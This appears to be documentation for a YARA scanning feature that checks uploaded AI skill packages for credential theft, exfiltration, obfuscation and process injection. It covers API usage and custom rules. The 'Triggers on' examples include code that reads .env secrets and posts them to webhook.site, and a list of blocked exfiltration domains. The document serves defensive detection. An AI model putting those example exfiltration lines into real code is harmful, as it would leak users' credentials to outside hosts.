# YARA Security Scanning

## Overview

TAIS Registry includes a **YARA-based security scanning engine** that automatically detects malicious patterns in skill packages. This provides automated security analysis for all submitted skills.

## Features

- ✅ **Automated Scanning** - Scan skills on upload
- ✅ **Pattern Detection** - Detect credential theft, data exfiltration, malicious domains
- ✅ **Severity Classification** - Critical, High, Medium, Low severity levels
- ✅ **Detailed Reports** - Full security reports with findings and recommendations
- ✅ **Custom Rules** - Add your own YARA rules
- ✅ **API Integration** - Programmatic scanning via REST API

## Quick Start

### 1. Scan a Skill Package

```bash
# Upload and scan a skill package
curl -X POST http://localhost:3000/api/scan \
  -F "package=@skill-package.zip" \
  -F "skillHash=0xabc123..."
```

### 2. View Scan Results

```bash
# Get scan results for a skill
curl http://localhost:3000/api/scan/0xabc123...
```

### 3. Get Detailed Security Report

```bash
# Get comprehensive security report
curl http://localhost:3000/api/scan/0xabc123.../report
```

## Default YARA Rules

The system includes 6 default security rules:

### 1. Credential Theft (`credential_theft`)
**Severity:** Critical

Detects attempts to:
- Access `.env` files
- Read environment variables containing secrets
- Send credentials to external servers

```yara
// Triggers on:
- fs.readFileSync('.env')
- process.env.API_KEY
- fetch('https://webhook.site/...', { body: process.env.SECRET })
```

### 2. Data Exfiltration (`data_exfiltration`)
**Severity:** High

Detects:
- Data sent to suspicious domains
- Base64 encoding of sensitive data
- Unusual network requests

```yara
// Triggers on:
- fetch('https://webhook.site/abc', { body: data })
- Encoded data transmission
```

### 3. Malicious Domains (`malicious_domains`)
**Severity:** Critical

Blocks known malicious/suspicious domains:
- webhook.site
- requestbin.com
- ngrok.io
- pastebin.com

### 4. Process Injection (`process_injection`)
**Severity:** High

Detects:
- Child process execution
- Code evaluation (eval, Function)
- VM context manipulation

### 5. Suspicious Imports (`suspicious_imports`)
**Severity:** Medium

Flags:
- Dangerous Node.js modules (fs, child_process, net)
- Obfuscated require statements
- Dynamic imports

### 6. Obfuscated Code (`obfuscated_code`)
**Severity:** Medium

Detects:
- Base64 encoded payloads
- Hexadecimal encoding
- Unicode escape sequences
- Long encoded strings

## API Reference

### Scan Endpoints

#### POST /api/scan
Upload and scan a skill package.

**Request:**
```bash
curl -X POST http://localhost:3000/api/scan \
  -F "package=@skill.zip" \
  -F "skillHash=0xabc123"
```

**Response:**
```json
{
  "skillHash": "0xabc123",
  "timestamp": "2024-02-05T20:00:00Z",
  "severity": "suspicious",
  "findings": [
    {
      "rule": "credential_theft",
      "namespace": "default",
      "tags": ["credential_access"],
      "meta": {
        "description": "Detects attempts to access credential files",
        "severity": "critical"
      },
      "strings": [
        {
          "identifier": "$env_file",
          "instances": [
            {
              "offset": 1234,
              "length": 10,
              "data": ".env"
            }
          ]
        }
      ]
    }
  ],
  "summary": {
    "totalRules": 6,
    "matchedRules": 2,
    "critical": 1,
    "high": 0,
    "medium": 1,
    "low": 0
  },
  "scanDuration": 150,
  "scannedFiles": 5,
  "scannedBytes": 10240
}
```

#### GET /api/scan/:skillHash
Get scan history for a skill.

**Response:**
```json
{
  "skillHash": "0xabc123",
  "totalScans": 3,
  "latestScan": { ... },
  "scanHistory": [ ... ]
}
```

#### GET /api/scan/:skillHash/report
Get detailed security report.

**Response:**
```json
{
  "skillHash": "0xabc123",
  "scanDate": "2024-02-05T20:00:00Z",
  "overallSeverity": "suspicious",
  "summary": {
    "totalRules": 6,
    "matchedRules": 2,
    "critical": 1,
    "high": 0,
    "medium": 1,
    "low": 0
  },
  "findings": {
    "bySeverity": {
      "critical": [...],
      "high": [],
      "medium": [...],
      "low": []
    },
    "byCategory": {
      "credential_access": [...],
      "exfiltration": []
    },
    "total": 2
  },
  "recommendations": [
    "🟠 HIGH: Security issues must be addressed before approval",
    "Audit all network requests and file access patterns"
  ]
}
```

#### GET /api/scan/rules
List available YARA rules.

**Response:**
```json
{
  "rules": [
    {
      "name": "credential_theft",
      "filename": "credential_theft.yar",
      "path": "/app/yara-rules/credential_theft.yar"
    }
  ],
  "total": 6,
  "scannerInitialized": true
}
```

## Custom YARA Rules

### Adding Custom Rules

1. Create a `.yar` file in the `yara-rules/` directory:

```yara
// yara-rules/my_custom_rule.yar
rule My_Custom_Rule {
  meta:
    description = "Description of what this rule detects"
    severity = "high"
    category = "custom_category"
    author = "Your Name"
    date = "2024-02-05"
  
  strings:
    $pattern1 = "suspicious_string"
    $pattern2 = /regex_pattern/
    $hex = { 48 65 6C 6C 6F }  // "Hello" in hex
  
  condition:
    $pattern1 or $pattern2 or $hex
}
```

2. Restart the server or call reload endpoint

### Rule Best Practices

```yara
rule Good_Example {
  meta:
    description = "Clear description of what this detects"
    severity = "high"              // critical, high, medium, low
    category = "injection"         // logical grouping
    author = "Security Team"
    date = "2024-02-05"
    reference = "https://docs.example.com/threat"
  
  strings:
    // Use descriptive variable names
    $eval_func = /eval\s*\(/
    $function_cons = /new\s+Function\s*\(/
    
    // Use nocase for case-insensitive matching
    $dangerous = "DANGEROUS" nocase
    
    // Use wide for UTF-16 strings
    $unicode = "text" wide
  
  condition:
    // Clear logic with comments
    // Match if eval or Function constructor is used
    ($eval_func or $function_cons) and
    // And dangerous keyword is present
    $dangerous
}
```

### Severity Levels

- **Critical** - Immediate threat, block skill
- **High** - Serious security issue, requires review
- **Medium** - Suspicious pattern, flag for review
- **Low** - Minor issue, informational

## Integration Examples

### Automatic Scanning on Upload

```typescript
// In your upload handler
app.post('/api/skills', async (req, res) => {
  // Save skill
  const skill = await saveSkill(req.body);
  
  // Scan automatically
  const scanResult = await yaraScanner.scanDirectory(
    skill.path, 
    skill.skillHash
  );
  
  // Store result
  await saveScanResult(skill.id, scanResult);
  
  // Block if critical issues found
  if (scanResult.severity === 'malicious') {
    await blockSkill(skill.id);
  }
  
  res.json({ skill, scan: scanResult });
});
```

### CI/CD Integration

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Scan skill package
        run: |
          curl -X POST http://api.tais.ai/api/scan \
            -F "package=@skill.zip" \
            -F "skillHash=${{ github.sha }}"
      
      - name: Check scan results
        run: |
          RESULT=$(curl http://api.tais.ai/api/scan/${{ github.sha }})
          if echo "$RESULT" | grep -q '"severity":"malicious"'; then
            echo "Security scan failed!"
            exit 1
          fi
```

## Security Report Interpretation

### Severity Guide

| Severity | Action Required | Examples |
|----------|----------------|----------|
| **Critical** | Block immediately | Credential theft, backdoors |
| **High** | Block until fixed | Data exfiltration, injection |
| **Medium** | Review required | Suspicious patterns |
| **Low** | Informational | Minor code smells |

### False Positives

Some patterns may trigger false positives:

```javascript
// This might trigger credential_theft rule
const config = require('./config.json');  // False positive

// This is legitimate
const config = require('./app-config.json');  // OK
```

**Resolution:**
1. Review the finding manually
2. Check if it's a legitimate use case
3. Add exclusion if necessary
4. Update rule to reduce false positives

## Performance

### Scanning Speed

- Small packages (< 1MB): < 100ms
- Medium packages (1-10MB): < 500ms
- Large packages (> 10MB): < 2s

### Optimization Tips

1. **Exclude non-code files:**
   ```typescript
   yaraScanner.scanDirectory(path, skillHash, {
     exclude: ['*.png', '*.jpg', '*.pdf']
   });
   ```

2. **Limit file size:**
   ```typescript
   yaraScanner.scanDirectory(path, skillHash, {
     maxFileSize: 1024 * 1024 // 1MB
   });
   ```

3. **Parallel scanning:**
   ```typescript
   // Scanner automatically uses async I/O
   const results = await Promise.all(
     skills.map(s => yaraScanner.scanFile(s.path, s.hash))
   );
   ```

## Troubleshooting

### Scanner Not Initializing

```bash
# Check if YARA is installed
npm install

# Verify native dependencies
npm rebuild yara

# Check logs
npm run dev 2>&1 | grep -i yara
```

### Rules Not Loading

```bash
# Check rules directory
ls -la yara-rules/

# Verify rule syntax
yara -t yara-rules/*.yar

# Reload rules
curl -X POST http://localhost:3000/api/scan/reload
```

### High Memory Usage

```typescript
// Limit concurrent scans
const pLimit = require('p-limit');
const limit = pLimit(5);

const results = await Promise.all(
  skills.map(s => limit(() => 
    yaraScanner.scanFile(s.path, s.hash)
  ))
);
```

## Best Practices

1. **Scan Early** - Scan skills immediately on upload
2. **Scan Often** - Re-scan on skill updates
3. **Review Findings** - Don't rely solely on automated scans
4. **Update Rules** - Keep YARA rules current
5. **Log Everything** - Track all scans for auditing
6. **Set Thresholds** - Define clear severity policies
7. **Human Review** - Always have security team review critical findings

## References

- [YARA Documentation](https://yara.readthedocs.io/)
- [YARA Rules Repository](https://github.com/Yara-Rules/rules)
- [Writing YARA Rules](https://yara.readthedocs.io/en/stable/writingrules.html)

---

**Last Updated:** February 5, 2026
**Version:** 1.0.0